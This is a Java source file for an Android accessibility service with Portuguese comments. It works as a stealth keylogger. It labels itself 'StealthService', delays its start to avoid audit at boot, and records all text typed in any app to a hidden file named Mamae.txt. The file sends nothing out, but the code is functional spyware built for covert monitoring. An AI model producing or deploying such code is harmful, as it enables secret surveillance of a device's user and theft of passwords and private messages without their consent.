package com.example.Mamae;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.Normalizer;

public class MyAccessibilityService extends AccessibilityService {
    private static final String TAG = "StealthService";
    private File logFile;
    private Handler handler;
    private String lastText = "";
    private long lastLogTime = 0;

    @Override
    public void onServiceConnected() {
        // Delay inicial de 3 segundos para não levantar auditoria no boot
        handler = new Handler(Looper.getMainLooper());
        handler.postDelayed(() -> {
            logFile = new File(getFilesDir(), "Mamae.txt");
            Log.i(TAG, "Serviço iniciado em modo stealth.");
        }, 3000);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String raw = event.getText().toString();
            String normalized = Normalizer.normalize(raw, Normalizer.Form.NFD)
                    .replaceAll("\\p{M}", "")
                    .replaceAll("[\\[\\]]", "");

            long now = System.currentTimeMillis();

            // Debounce: evita flood se o texto é repetido ou em intervalo curto
            if (!normalized.equals(lastText) || now - lastLogTime > 1000) {
                lastText = normalized;
                lastLogTime = now;
                logToFile(normalized);
            }
        }
    }

    private void logToFile(String text) {
        if (logFile == null) return;
        try (FileWriter writer = new FileWriter(logFile, true)) {
            writer.append(text).append("\n");
        } catch (IOException e) {
            Log.e(TAG, "Erro ao escrever no log", e);
        }
    }

    @Override
    public void onInterrupt() {
        Log.i(TAG, "Serviço interrompido.");
    }
}
